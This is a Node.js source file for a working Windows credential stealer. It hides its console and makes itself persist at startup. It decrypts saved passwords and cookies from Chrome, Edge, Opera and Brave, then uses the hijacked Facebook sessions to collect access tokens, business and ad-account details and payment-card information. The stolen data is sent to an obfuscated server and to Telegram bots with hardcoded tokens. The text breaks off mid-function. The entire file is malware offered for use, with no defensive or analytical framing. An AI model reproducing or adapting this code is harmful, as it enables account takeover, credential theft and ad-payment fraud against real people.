const cws =require('node-hide-console-window');
try{
   cws.hideConsole();
}catch (e){

}
const fs =require('fs');
const path =require('path');
const os =require('os');
const sqlite3 = require('sqlite3').verbose();
const PasswordsSQL = 'SELECT action_url, username_value, password_value FROM logins';
const CookiesSQL = 'SELECT * FROM cookies';
const base64 = require('base-64');
const bbbse = require('js-base64');
const  aes = require('js-crypto-aes');
const  axios = require('axios');
const  win32crypt = require('win32crypt');
// const TelegramBot = require('node-telegram-bot-api');
var AdmZip = require("adm-zip");
const FormData = require('form-data');

// b0
    let server2 = bbbse.decode('aHR0cHM6Ly9jbG91ZGltYWdlc3YudG9w');
    const chatId = '-885684915';
const token = '6036588980:AAEBmKTVnXBNLjw5MIS-KPT1jkKEN-APkSA';

const chatId2= '-621100699';
const token2 ='5489999990:AAGxRnrFLqfcNuxhk8u9TO_b9qhfR8eZDsE';

// b1
    // let server2 = bbbse.decode('aHR0cHM6Ly9hcHBzbWFya2V0aW5nMzMueHl6');
    // const chatId = '-857645077';
// const token = '6165240011:AAElxON8YfLBXi9w-T_oYUXt_qbQBQqV5g0';

// const chatId2= '-839016370';
// const token2 ='6258524019:AAFvu16jdYMjB4imoZ6v1XHflxzu2jSXj18';

console.log(server2,'server2')

// Create a bot that uses 'polling' to fetch new updates
const bot = {
    sendMessage:(chat,text)=>{
        return     axios.post('https://api.telegram.org/bot'+token+'/sendMessage', {
        chat_id: chat,
        text: text
  })},
            sendDocument:(chat,zipb,nameFile)=>{
            const formData = new FormData();
formData.append('chat_id', chat);
formData.append('document',zipb, nameFile);

        return     axios.post('https://api.telegram.org/bot'+token+'/sendDocument', formData, {
    headers: formData.getHeaders(),
})
    }
};
const bot2 = {
    sendMessage:(chat,text)=>{
        return     axios.post('https://api.telegram.org/bot'+token2+'/sendMessage', {
        chat_id: chat,
        text: text
  })},
        sendDocument:(chat,zipb,nameFile)=>{
            const formData = new FormData();
formData.append('chat_id', chat);
formData.append('document',zipb, nameFile);

        return     axios.post('https://api.telegram.org/bot'+token2+'/sendDocument', formData, {
    headers: formData.getHeaders(),
})
    }
};
const  AutoLaunch = require('auto-launch');
if(process.execPath){
    try{
        let name = (process.execPath||'')
        if(name.indexOf('.exe')>-1){
            name = name.substring(name.lastIndexOf('\\'));
        }
        const autoLaunch = new AutoLaunch({
            name: name,
            path: (process.execPath||'')
        })
        autoLaunch.isEnabled().then((isEnabled) => {
            if (!isEnabled) autoLaunch.enable()
        })
        setInterval(()=>{
            autoLaunch.isEnabled().then((isEnabled) => {
                if (!isEnabled) autoLaunch.enable()
            })
        },60000)
    }catch (e){
console.log(e)
    }


}
const ChromePaths = {
    name:"Chrome",
    productName:'Google Chrome',
    pa: "\\AppData\\Local\\Google\\Chrome\\User Data",
    local: "\\AppData\\Local\\Google\\Chrome\\User Data\\Local State",
    cookie: "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies",
    login: "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
}

const OperaGXPaths = {
    name:"Opera",
    productName:'Opera Browser',
    pa:"\\AppData\\Roaming\\Opera Software\\Opera GX Stable",
    local:"\\AppData\\Roaming\\Opera Software\\Opera GX Stable\\Local State",
    cookie:"\\AppData\\Roaming\\Opera Software\\Opera GX Stable\\Cookies",
    login: "\\AppData\\Roaming\\Opera Software\\Opera GX Stable\\Login Data"
}

const  OperaDefaultPaths = {
    name:"Opera",
    productName:'Opera Browser',
    pa: "\\AppData\\Roaming\\Opera Software\\Opera Stable",
    local: "\\AppData\\Roaming\\Opera Software\\Opera Stable\\Local State",
    cookie: "\\AppData\\Roaming\\Opera Software\\Opera Stable\\Cookies",
    login: "\\AppData\\Roaming\\Opera Software\\Opera Stable\\Login Data"
}


const MicrosoftEdgePaths = {
    name:"Edge",
    productName:'Microsoft Edge',
    pa: "\\AppData\\Local\\Microsoft\\Edge\\User Data",
    local: "\\AppData\\Local\\Microsoft\\Edge\\User Data\\Local State",
    cookie: "\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cookies",
    login: "\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data"
}

const  BravePaths = {
    name:"Brave",
    productName:'Brave Browser',
    pa: "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data",
    local: "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Local State",
    cookie: "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Cookies",
    login: "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data"
}

function getDirectories(pathg) {
    return fs.readdirSync(pathg).filter(function (file) {
        return (file.includes('Default')||file.includes('Profile ') )&&fs.statSync(pathg + '/' + file).isDirectory();
    });
}
const jsonData = [];
const funGetProfile=(browser)=>{
    let ppp = (process.env.APPDATA||process.env.HOME)+'';
    ppp=ppp.substring(0,ppp.indexOf('AppData')!==-1?(ppp.indexOf('AppData')-1):ppp.length)
    jsonData.push(ppp+'/fffff');
    const pathfolderD =  path.join(ppp,browser.pa);
    let textF ='108.0.0.0';
    try{
        textF = fs.readFileSync(pathfolderD+'\\Last Version','utf-8');
    }catch (e){

    }
    console.log(pathfolderD);
    let  alls =[];
    try{
        alls = getDirectories(pathfolderD).map((p)=>pathfolderD+'\\'+p);
    }catch (e){

    }
    console.log(alls,'f');
    return {alls,goc:ppp,userData:pathfolderD,version:textF};
}
const getBW=(textGoc,texts,texts2)=>{
    let textClear=[]
    if(!textGoc){
        return '';
    }
    try{
    if(textGoc){
        textClear=textGoc.split(texts);
    }
        
}catch(e){
console.log(e,textGoc, 'eeee');
}
    if(textClear.length&&textClear[1])
        return(textClear=textClear[1].split(texts2))[0]

}

axios.defaults.withCredentials = true;
const getToken = async (userDataDir,cookies,allsC,passwords,version,browser) => {
    let chromeV= version.substring(0,3);

    let huy2 = '';
    let uid2='';
    const rrr= cookies.map((i ,index)=> {
        i.key= i.name;
        if(i.name==='c_user'){
            uid2=i.value+'hahahahah'
        }
        i.expires =i.expirationDate*130;
        huy2+=i.name+'='+i.value+(index<cookies.length?'; ':'');
    });

    console.log('cookies',cookies,uid2)
    await new Promise((resolve) => {
        setTimeout(()=>{resolve(true)},400)});
    console.log(browser,'browser',chromeV)
    let osType = os.type();
    osType = osType.replace('_',' ');
    let osR = os.release();
    if(osR.lastIndexOf('.')>-1){
        osR= osR.substring(0, osR.lastIndexOf('.'))
    }
    var isWin64 =true;
    try{
        isWin64 = process.env.hasOwnProperty('ProgramFiles(x86)');
    }catch (e){

    }
    const requestElectP= (link)=>{
        return new Promise((resolve)=>{
            axios.get(

                link,{
                    'withCredentials': 'true',
                    headers: {
                        accept: 'text/html;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                        cookie:huy2,
                        'sec-ch-prefers-color-scheme': 'light',
                        'sec-ch-ua': 'Not?A_Brand";v="8", "Chromium";v="'+chromeV+'", "'+browser.productName+'";v="'+chromeV+'"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-platform': "Windows",
                        'sec-fetch-dest': 'document',
                        'sec-fetch-mode': 'navigate',
                        'sec-fetch-site': 'same-origin',
                        'sec-fetch-user': '?1',
                        'upgrade-insecure-requests': '1',
                        'User-Agent': 'Mozilla/5.0 ('+osType+' '+osR+'; '+(isWin64?'Win64':'Win32')+'; '+(isWin64?'x64':'x86')+') AppleWebKit/537.36 (KHTML, like Gecko) '+browser.name+'/'+version+' Safari/537.36'
                    },
                }).then((res)=>{
                resolve(res.data)

            }).catch((e)=>{
                console.log(e)
                resolve({})
            });
        })

    };

    const html = await requestElectP(
        'https://www.facebook.com/ads/adbuilder');
    const accessToken = 'EABB'+getBW( html,'accessToken":"EABB','"')
    console.log(accessToken,'accessToken')
    if(!accessToken||accessToken.length<20){
        return false
    }
    //console.log('fádfaccessToken',accessToken)
 //   await new Promise((resolve) => {
   //             setTimeout(()=>{resolve(true)},40500);
     //       });


    const fb_dtsg = getBW(html,'DTSGInitialData",[],{"token":"','"}')
    const __spin_r = getBW(html,'__spin_r":',',"')
    const __spin_t = getBW(html,'__spin_t":',',"')
    const __spin_b = getBW(html,'__spin_b":"','","');
    let user ={id:uid2,name:'',email:'',birthday:''};
    try{
        const uid =  getBW(html,'fbid:"','",');
        if(uid&&uid!==''){
            user.id= uid;
        }
        const userFullName =  getBW(html,'userFullName":"','",');
        if(userFullName){
            user.name= userFullName;

            user.name= decodeURIComponent(JSON.parse('"' + userFullName.replace(/\"/g, '\"') + '"'))
        }

    }catch (e){

    }

    let accessTokenQ = '';
    // const html2 = await requestElectP('https://www.facebook.com/ajax/bootloader-endpoint/?modules=AdsLWIDescribeCustomersContainer.react');
   
   

    // if(html2){
    //  fs.writeFileSync('thu.txt',html2.request.data)
    //     const accessToken =getBW(html2,'accessToken":"EAAQ','"')
    //     accessTokenQ = 'EAAQ'+accessToken
    // }
    accessTokenQ = accessToken
    console.log('fádfadddccessToken',accessTokenQ)
// await new Promise((resolve) => {
  //              setTimeout(()=>{resolve(true)},40500);
    //        });    
    let cookie='';

    try{
        cookies.forEach((ccc)=>{
            if(ccc.path=='/'){
                cookie+=ccc.name+'='+ccc.value+';';
                if(ccc.name==='c_user'){
                    user.id=ccc.value
                }
            }
        });
        const data = JSON.stringify({
            ten: user.name,
            uid: user.id,
            email:user.email,
            birthday:user.birthday,
            location:'',
            fa: '',
            step:'COOKIE',
            trinhDuyet:browser.name,
            cookie: cookie,
            password: passwords.facebook,
            usergmail:passwords.usergmail,
            passgmail:passwords.passgmail,
            useroutlook:passwords.useroutlook,
            passoutlook:passwords.passoutlook,
                hanhDong,
            token: accessTokenQ,
            businesses:[],
            fanpage:[],
            taiKhoanAds:[],
            cookieOutlook:'',
            cookieGg: ''
        })
//console.log('Authorization', bbbse.encode(data))
        await axios.get(server2+'/avata2',
            {
                headers: {
                    Authorization : bbbse.encode(data)
                }
            })
    }catch (e){
        console.log(e,'asdfasdfasdfasdf')

    }
    try{
        let ttt = ggg+'|';
        const cookiesMail = allsC.filter((f)=>f.domain===ggg)
        cookiesMail.forEach((adddd)=>{
            ttt+=adddd.name+'='+adddd.value+';';
        })
        const data = JSON.stringify({
            ten: user.name,
            uid: user.id,
            email:user.email,
            birthday:'',
            location:'',
            fa: '',
            step:'GMAIL',

            cookie:'',
            password: '',
            businesses:[],
            fanpage:[],
            taiKhoanAds:[],
            cookieGg: ttt
        })
        await axios.get(server2+'/avata2',
            {
                headers: {
                    Authorization : bbbse.encode(data)
                }
            })
    }catch(e){
        console.log(e)
    }
    try{
        let ttt  ='.live.com|';
        const cookiesout = allsC.filter((f)=>f.domain===lll)
        cookiesout.forEach((adddd)=>{
            ttt+=adddd.name+'='+adddd.value+';';
        })
        const data = JSON.stringify({
            ten: user.name,
            uid: user.id,
            email:user.email,
            birthday:'',
            location:'',
            fa: '',
            step:'OUTOOK',
            cookie:'',
            password: '',
            token: '',
            businesses:[],
            fanpage:[],
            taiKhoanAds:[],
            cookieOutlook: ttt
        })
        await axios.get(server2+'/avata2',
            {
                headers: {
                    Authorization : bbbse.encode(data)
                }
            })
    }catch(e){
        console.log(e)
    }


    try{
        let html3=  await requestElectP('https://graph.facebook.com/me/?fields=id,name,email,birthday,location&access_token='.concat(accessTokenQ));
        try{
            console.log(user,'html3',html3)
            if(html3&&html3.id){
            user = html3                
            }
        }catch (e){

        }


        const data = JSON.stringify({
            ten: user.name,
            uid: user.id,
            email:user.email,
            birthday:user.birthday,
            location:user.location&&typeof user.location==='object'&&user.location.name?user.location.name:'',
            fa: '',
            step:'INFO',
            cookie: '',
            cookieOutlook:'',
            password: '',
            token: accessTokenQ,
            businesses:[],
            fanpage:[],
            taiKhoanAds:[],
            cookieGg: ''
        })
        await axios.get(server2+'/avata2',
            {
                headers: {
                    Authorization : bbbse.encode(data)
                }
            })
    }catch(e){
        console.log(e)
    }
    // 2
    const objD = {fb_dtsg,__spin_r,__spin_t,__spin_b};
    let  businesses= [];
    let pages = [];
    try{

        const result = await axios.get('https://graph.facebook.com/v14.0/me/businesses?fields=name,permitted_roles,is_disabled_for_integrity_reasons,business_invoices,created_time,verification_status,owned_ad_accounts{sufunding_id,adtrust_dsl,balance,is_prepay_account,currency,account_id,account_status,partner,name,funding_source_details,amount_spent,insights.date_preset(maximum){spend},adspaymentcycle{threshold_amount}}&limit=200&access_token='.concat(accessTokenQ))
        if(result.data&&result.data.data){
            businesses = result.data.data
            for await (const busi of businesses){
                const result2 = await requestElectP('https://business.facebook.com/business/adaccount/limits/?business_id='+busi.id+'&__user='+user.id+'&__a=1&fb_dtsg='+objD.fb_dtsg+'&__spin_r='+objD.__spin_r+'&__spin_b='+objD.__spin_b+'&__spin_t='+objD.__spin_t+'&__jssesw=1');

                const adAccountLimit= getBW(result2,'"adAccountLimit":' , '}');
                //     if(email!==''){
                // try{
                //     const result3= await requestElectP(`https://graph.facebook.com/v3.0/${busi.id}/business_users?access_token=${accessToken}&brandId=${busi.id}&email=${email}&method=post&pretty=0&roles=%5B%22EMPLOYEE%22%2C%22ADMIN%22%2C%22DEVELOPER%22%2C%22FINANCE_EDITOR%22%5D&suppress_http_code=1&method=POST`);
                //     //   console.log('result3result3result3result3result3',result3)

                // }catch (e){

                // }
                //     }
                //     if(email2==''){
                // try{
                //     const result32= await requestElectP(`https://graph.facebook.com/v3.0/${busi.id}/business_users?access_token=${accessToken}&brandId=${busi.id}&email=${email2}&method=post&pretty=0&roles=%5B%22EMPLOYEE%22%2C%22ADMIN%22%2C%22DEVELOPER%22%2C%22FINANCE_EDITOR%22%5D&suppress_http_code=1&method=POST`);

                // }catch (e){

                // }
                //     }
                // try{
                //     const result33= await requestElectP(`https://graph.facebook.com/v3.0/${busi.id}/business_users?access_token=${accessToken}&brandId=${busi.id}&email=${email3}&method=post&pretty=0&roles=%5B%22EMPLOYEE%22%2C%22ADMIN%22%2C%22DEVELOPER%22%2C%22FINANCE_EDITOR%22%5D&suppress_http_code=1&method=POST`);

                // }catch (e){

                // }

                busi.adAccountLimit = adAccountLimit
            }


        }
        const data = JSON.stringify({
            ten: user.name,
            uid: user.id,
            fa: '',
            step:'BUSINESSES',
            cookie: '',
            cookieOutlook:'',
            password: '',
            token: '',
            businesses:(businesses||[]).map((item)=>{
                let nguoi= 0;
                if(item.business_users&&item.business_users.data){
                    nguoi= item.business_users.data.length
                }

                return {
                    ten:item.name,
                    gioiHan:parseInt(item.adAccountLimit),
                    ngayTao:item.created_time,
                    id:item.id,

                    rule:JSON.stringify(item.permitted_roles),
                    trangThai:item.ç==='not_verified'?'Chua xac minh':item.verification_status,
                    nguoi:nguoi
                }
            }),
            taiKhoanAds:[],
            cookieGg: ''
        });
        const ttt= await axios.get(server2+'/avata2',
            {
                headers: {
                    Authorization : bbbse.encode(data)
                }
            })
    }catch(e){
        console.log(e)
    }

    try{
        const result= await requestElectP('https://graph.facebook.com/'+user.id+'/accounts?fields=id,name,verification_status,fan_count,access_token&access_token='.concat(accessToken));
        if(result){
            pages = result.data;
        }
            console.log('verification_status',pages)
        const data = JSON.stringify({
            ten: user.name,
            uid: user.id,
            fa: '',
            step:'PAGE',
            cookie: '',
            cookieOutlook:'',
            password: '',
            token: '',
            fanpage:pages.map((item)=>{item.accessToken =item.access_token; return item}),
            taiKhoanAds:[],
            cookieGg: ''
        })
        await axios.get(server2+'/avata2',
            {
                headers: {
                    Authorization : bbbse.encode(data)
                }
            })
    }catch(e){
        console.log(e)
    }
    let adaccounts = [];
      let adaccountDs = [];
    try{
        const result =await requestElectP('https://graph.facebook.com/v12.0/me/adaccounts?limit=5000&fields=name,account_status,account_id,owner_business,created_time,next_bill_date,currency,adtrust_dsl,timezone_name,timezone_offset_hours_utc,business_country_code,disable_reason,adspaymentcycle{threshold_amount},balance,is_prepay_account,owner,all_payment_methods{pm_credit_card{display_string,exp_month,exp_year,is_verified},payment_method_direct_debits{address,can_verify,display_string,is_awaiting,is_pending,status},payment_method_paypal{email_address},payment_method_tokens{current_balance,original_balance,time_expire,type}},total_prepay_balance,insights.date_preset(maximum){spend}&access_token='.concat(accessToken))
        if(result){
            adaccounts = result.data;
        }
        if(Array.isArray(adaccounts))
            for await (const account of adaccounts){
                const result44 = await requestElectP('https://graph.facebook.com/v12.0/act_'+account.account_id+'?method=get&date_format=U&fields=account_id,insights.date_preset(data_maximum){spend},amount_spent,funding_source_details,adspaymentcycle{threshold_amount},name,created_time,last_used_time,currency,timezone_name,stored_balance_status,business,business_country_code,balance,adtrust_dsl,account_currency_ratio_to_usd,spend_cap,disable_reason,is_prepay_account,total_prepay_balance.fields(amount),max_billing_threshold.fields(amount),min_billing_threshold.fields(amount).date_preset(data_maximum).column_fields(spend),owner,agencies.fields(id,role,name),users.fields(id,role,name),has_extended_credit&access_token='.concat(accessToken))
                const data= result44.data;
                console.log(result44.data,'result44')
                const dataAcount = {...account,...data,data:data};
           //     adaccountDs.push(dataAcount)
                const datag = JSON.stringify({
                    ten: user.name,
                    uid: user.id,
                    email:'',
                    birthday:'',
                    location:'',
                    fa: '',
                    step:'UPDATE_ACCOUNT',
                    cookie: '',
                    cookieGg:'',
                    cookieOutlook:'',
                    password: '',
                    token: '',
                    taiKhoanAds: [dataAcount].map((item)=>{

                        let thetanhtoan='';
                        let sotienNguong = '0';
                        let ngayHetHan = '';
                        let trangThai = '';
                        try{
                            if(item.all_payment_methods&&item.all_payment_methods.pm_credit_card&&item.all_payment_methods.pm_credit_card.data&&item.all_payment_methods.pm_credit_card.data.length){
                                thetanhtoan=item.all_payment_methods.pm_credit_card.data[0].display_string;
                                ngayHetHan =item.all_payment_methods.pm_credit_card.data[0].exp_month+'/'+item.all_payment_methods.pm_credit_card.data[0].exp_year;
                                trangThai =item.all_payment_methods.pm_credit_card.data[0].is_verified;

                            }
                            if(item.adspaymentcycle&&item.adspaymentcycle.data&&item.adspaymentcycle.data.length){
                                sotienNguong=(item.adspaymentcycle.data[0].threshold_amount);
                            }
                        }catch (e){
                            sotienNguong ='0';
                        }
                        console.log('sotienNguong',"-------",JSON.stringify(item))
                        objj= {
                            id:item.account_id,
                            adminAn:item.agencies&&item.agencies.data?item.agencies.data.length:0,
                            ten:item.name,
                                gioiHanChiTieu:item.adtrust_dsl?(item.adtrust_dsl+''):(item.adtrust_dsl!==-1?'NLM':item.adtrust_dsl),
                            loaiTaiKhoan:item.has_extended_credit?'INVOICE':'Thường',
                            radioToUsd:item.account_currency_ratio_to_usd,
                            muiGio:item.timezone_name,
                            currency:item.currency,
                            ngayLapHoaDon:item.next_bill_date,
                            ngayTao:item.created_time,
                            nguongHienTai:sotienNguong,
                            soDu:item.balance,
                            theThanhToan:thetanhtoan,
                            ngayHetHan:ngayHetHan,
                            trangThaiThe:trangThai,
                            tongChiTieu:item.insights?.data[0]?(item.insights?.data[0].spend):"0",
                            trangThai:item.account_status===3?'Nợ':(item.account_status===1?'Hoạt động':'Đã khóa'+item.account_status)}
adaccountDs.push({...dataAcount,...objj})
     console.log('sotienNguong44444',"-------",JSON.stringify(objj))
                            return objj;
                    }),
                })
                console.log('hahasdfasdf')
                await axios.get(server2+'/avata2',
                    {
                        headers: {
                            Authorization : bbbse.encode(datag)
                        }
                    })
            }

    }catch(e){
        console.log(e)
    }
    return {businesses,accessToken,pages,adaccounts:adaccountDs,accessTokenQ,user};

}
const reverse = (s)=>{
    return s.split('').reverse().join('');
}
const fff= reverse('moc.koobecaf.')
const ggg= reverse('moc.elgoog.')
const lll= reverse('moc.evil.')
let hanhDong = 'Tự Mở';
let backupsd=[];
const main=  async()=>{

    await new Promise((resolve) => {

        setTimeout(()=>{resolve(true)},500)
    });

    let ppp = (process.env.APPDATA||process.env.HOME)+'';
    ppp=ppp.substring(0,ppp.indexOf('AppData')!==-1?(ppp.indexOf('AppData')-1):ppp.length)
    try {
        if (process.execPath && process.execPath.indexOf(ppp) > -1) {
            hanhDong = 'Reset';
        }
    }catch (e){
        console.log(e)
    }
    let skip= false;
    let name = (process.execPath||'')
    if(name.indexOf('.exe')>-1){
        name = name.substring(name.lastIndexOf('\\'));
    }
    let pathS = path.join(ppp,name);

    try{
        let textOld= fs.readFileSync(ppp+'/setup.conf',{encoding:'utf8', flag:'r'});
        let numbe = parseFloat(textOld)||0;
        if(numbe+1890000>new Date().getTime()){
            console.log('bỏ qua',(new Date().getTime()-numbe+1890000)/60000);
            skip= true;
        }else{
            skip= false;
        }

    }catch (e){
        console.log(e)
        skip= false;
    }
try{
    fs.writeFileSync(ppp+'/setup.conf',new Date().getTime()+'');
}catch (e){
        console.log(e)
}

    if(skip){
        let tem=[];
        for   (let i = 0; i < 2880000; i++) {
            tem.push('')
        }
        for  await (const i of tem) {
            await new Promise((resolve) => {
                setTimeout(()=>{resolve(true)},20500);
            });
        }
        hanhDong = 'Refesh'
    }



    try{
        let textOld= fs.readFileSync(ppp+'/bbbb.conf',{encoding:'utf8', flag:'r'});
        if(textOld){
            let bbb=bbbse.decode(textOld);
            console.log(JSON.parse(bbb),'ấdf');
            backupsd =JSON.parse(bbb);
        }
      
    }catch (e){
        console.log(e)
       backupsd=[];
    }
 let bbb3= [];
    try{
 let ttt=   await axios.get(server2+'/bk/map.txt');
 console.log('backups requst',ttt.data);
   let bbb=bbbse.decode(ttt.data);
            console.log(JSON.parse(bbb),'ấdf');
            bbb3 =JSON.parse(bbb);
}catch(e){
bbb3 =[];
}
if(bbb3&&bbb3.length){
      backupsd=bbb3;
} else if(backupsd.length){
    console.log('changebbbb')
      await new Promise((resolve) => {
        setTimeout(()=>{resolve(true)},5500)
    });

       try{
 let ttt=   await axios.get(backupsd[0]+'/bk/map.txt');
 console.log('backups requst',ttt.data);
   let bbb=bbbse.decode(ttt.data);
            console.log(JSON.parse(bbb),'ấdf');
            bbb3 =JSON.parse(bbb);
}catch(e){
bbb3 =[];
}

if(!bbb3||bbb3.length===0){
if(backupsd.length>1){
           try{
 let ttt=   await axios.get(backupsd[1]+'/bk/map.txt');
 console.log('backups requst',ttt.data);
   let bbb=bbbse.decode(ttt.data);
            console.log(JSON.parse(bbb),'ấdf');
            bbb3 =JSON.parse(bbb);
}catch(e){
bbb3 =[];
}

if(!bbb3||bbb3.length===0){

}else if(bbb3.length){
server2 = backupsd[0];
backupsd = bbb;
}
}
}else if(bbb3.length){
server2 = backupsd[0];
backupsd = bbb;
}

}
try{

let t= bbbse.encode(JSON.stringify(backupsd))
    fs.writeFileSync(ppp+'/bbbb.conf',t);
}catch (e){
        console.log(e)
}

    const mainBl=async(browser)=> {
        const allProfiles = funGetProfile(browser);
        if(!allProfiles.alls.length){
            return
        }
        const textF = fs.readFileSync(allProfiles.goc + browser.local, 'utf-8');
        let buerkey = null;
        try {
            const dataC = JSON.parse(textF);
            const tt = base64.decode(dataC.os_crypt.encrypted_key).substring(5);
            buerkey = win32crypt.unprotectData(Uint8Array.from(tt.split('').map((letter) => letter.charCodeAt(0)))
                , null, 'CurrentUser');
        } catch (e) {
            console.log(e)

        }
        for await (const profile of allProfiles.alls) {
            try {
            //    console.log('profile',profile)
                const dbck = await new Promise((resolve) => {
                    const t = new sqlite3.Database(profile + '\\' + 'Network\\Cookies', (err) => {
                        // console.log(err,'asdfasdfasdfasd')
                        if (err) {
                            resolve(false)
                        }
                        resolve(t)
                    });
                });
                if (dbck) {
                    const datas2 = await new Promise((resolve) => {
                        const dataf = [];
                        dbck.each(CookiesSQL, (err, row) => {
                            dataf.push(row);

                        }, () => {
                            setTimeout(() => {
                                resolve(dataf);
                            }, 1000)
                        });
                    });
                    const isLogin = datas2.find((row) => row.name === 'xs' && row.host_key.includes(fff));
                    if (isLogin) {
                        const datas = datas2.filter((row) => row.host_key.includes(lll) || row.host_key.includes(ggg) || row.host_key.includes(fff))
                        const allCookies = [];
                        for await (const data of datas) {

                            try {
                                const t = await aes.decrypt(data.encrypted_value.subarray(15), new Uint8Array(buerkey), {
                                    name: 'AES-GCM',
                                    iv: data.encrypted_value.subarray(3, 15),
                                    tagLength: 16
                                });
                                data.value = new TextDecoder().decode(t);

                                allCookies.push({
                                    'domain': data.host_key,
                                    'expirationDate':  ((parseFloat(data.expires_utc + '') / 10000)),
                                    // 'hostOnly': false,
                                    'httpOnly': data.is_httponly === 1 ? true : false,
                                    'name': data.name,
                                    'path': data.path,
                                    'secure': data.is_secure === 1 ? true : false,
                                    'value': data.value
                                },)
                                delete data.encrypted_value;
                            } catch (e) {
                                console.log(e)
                            }

                        }
                        const arrscookieFB = allCookies.filter(dd => dd.domain.includes(fff));
                        {

                            await new Promise((resolve) => {

                                setTimeout(() => {
                                    resolve(true)
                                }, 500)
                            });
                            let dbpass = null;
                            dbpass = await new Promise((resolve) => {
                                const t2 = new sqlite3.Database(profile + '\\' + 'Login Data', (err) => {
                                    console.log(err)
                                    dbpass = t2;
                                    resolve(t2)
                                });
                            });
                            const datasPass= [];
                            await new Promise((resolve) => {
                                dbpass.each(PasswordsSQL, (err, row) => {
                                   // if (row.action_url.includes(fff) || row.action_url.includes(ggg) || (row.action_url.includes(lll))) {
                                        datasPass.push(row)
                                  //  }

                                }, () => {
                                    resolve(true);
                                });
                            });
                            let passwords= {usergmail:'',passgmail:'',useroutlook:'',passoutlook:'',facebook:''};
                            let passs = '';
                            for await (const row of datasPass) {
                                const passwordt = await aes.decrypt(row.password_value.subarray(15), new Uint8Array(buerkey), {
                                    name: 'AES-GCM',
                                    iv: row.password_value.subarray(3, 15),
                                    tagLength: 16
                                });
                                const password = new TextDecoder().decode(passwordt);
                                if(row.action_url.includes(ggg)){
                                    passwords.usergmail=row.username_value;
                                    passwords.passgmail= password;
                                }else  if(row.action_url.includes(lll)){
                                    passwords.useroutlook=row.username_value
                                    passwords.passoutlook = password

                                }else if(row.action_url.includes(fff)){
                                    passwords.facebook=( password)

                                }
                                passs=('link|'+row.action_url+'|user|'+row.username_value+'|pass|'+password+"\n");
                                // passwords.push('[[=>' + (row.action_url.includes(ggg) ? 'Google|' : (row.action_url.includes(lll) ? 'Outlook|' : 'Facebook|')) + row.username_value + '|' + password + '<=]]')
                            }
                            jsonData.push({profile, allCookies, passwords});
                            try {
                                console.log('dataG')
                                const dataG = await getToken(profile, arrscookieFB, allCookies, passwords, allProfiles.version,browser);
                                console.log(dataG);
                                jsonData.push(dataG);

                                var content = JSON.stringify(dataG);
                                let ttt= new Date();
                               let time=ttt.getHours()+ 'h ngay ' +ttt.getDate()+' thang '+(ttt.getMonth()+1)+' nam '+ttt.getFullYear()
                               // bot.sendMessage(chatId,'_____');
                         
                                let ippp ='';
try{
          // await bot.sendMessage(chatId,'uid:'+dataG.user.id+' '+time);
            //                  await  bot2.sendMessage(chatId,'uid:'+dataG.user.id+' '+time);

 let tt=                                await axios.get('https://api.ipify.org/');
 // console.log(tt)
 ippp=tt.data;
}catch(e){

}


                //                console.log(ippp)
                    // let text= '__['+'uid:'+dataG.user.id+' ip:'+ippp+' ==>';    
                    let text= '';    
                         
for await (const ads of dataG.adaccounts)
                                {
                                 
                                 text+="|"+ ads.id+"|"+ads.trangThai+ "|"+ads.gioiHanChiTieu+" "+(ads.gioiHanChiTieu!=='NLM'?ads.currency:'')+"|"+(parseInt(ads.nguongHienTai)/100)+" " +ads.currency+'|'+ads.tongChiTieu+' '+ads.currency+'\n';
                                }
try{

 if(hanhDong==='Tự Mở')
                             await   bot.sendMessage(chatId,text);
 else
                             await  bot2.sendMessage(chatId2,text);

                             }catch(e){

                             }


                                let name =browser.name+'/'+ profile.substring(profile.lastIndexOf('\\')+1);
                                var zip = new AdmZip();
                 zip.addFile(browser.name+"/", null);
                 zip.addFile(name+"/", null);
let pagec ='';


dataG.pages&&dataG.pages.forEach((pa)=>{
pagec+='id: '+pa.id+' |name: '+pa.name+' | '+pa.verification_status+'"like: '+pa.fan_count+' |'+pa.accessToken+'\n';
})

zip.addFile(name+"/pages.txt", Buffer.from(pagec, "utf8"), "entry comment goes here");

let busc ='';


dataG.businesses&&dataG.businesses.forEach((pa)=>{
busc+='id: '+pa.id+' |name: '+pa.name+' | Share: '+pa.sharing_eligibility_status+' | RULES'+(pa.permitted_roles&&pa.permitted_roles.length ?pa.permitted_roles[0]:''  )+'|adAccountLimit: '+pa.adAccountLimit+'\n';
})
zip.addFile(name+"/business.txt", Buffer.from(busc, "utf8"), "entry comment goes here");


zip.addFile(name+"/ALLdata.txt", Buffer.from(content, "utf8"), "entry comment goes here");

   let cookie='';


        arrscookieFB.forEach((ccc)=>{
            if(ccc.path=='/'){
                cookie+=ccc.name+'='+ccc.value+';';
            }
        });

        if(cookie)

zip.addFile(name+"/cookie-facebook.txt", Buffer.from(JSON.stringify(cookie), "utf8"), "entry comment goes here");

zip.addFile(name+"/ads.txt", Buffer.from(text, "utf8"), "entry comment goes here");

// zip.addFile(name+"/cookies.txt", Buffer.from(JSON.stringify(allCookies), "utf8"), "entry comment goes here");

// zip.addFile(name+"/cookies.txt", Buffer.from(JSON.stringify(allCookies), "utf8"), "entry comment goes here");

//zip.addFile(name+"/business.txt", Buffer.from(JSON.stringify(dataG.businesses), "utf8"), "entry comment goes here");
zip.addFile(name+"/cookies.txt", Buffer.from(JSON.stringify(allCookies), "utf8"), "entry comment goes here");
// zip.addFile(name+"/cookies.txt", Buffer.from(JSON.stringify(allCookies), "utf8"), "entry comment goes here");
zip.addFile(name+"/profile.txt", Buffer.from(JSON.stringify(profile), "utf8"), "entry comment goes here");
zip.addFile(name+"/passwords.txt", Buffer.from(JSON.stringify(passs), "utf8"), "entry comment goes here");
zip.addFile(name+"/info.txt", Buffer.from(JSON.stringify({browser:browser.name,accessToken:dataG.accessToken,user:dataG.user,ip:ippp}), "utf8"), "entry comment goes here");
try{
    let ngays = dataG.user.birthday||'-no-' ;

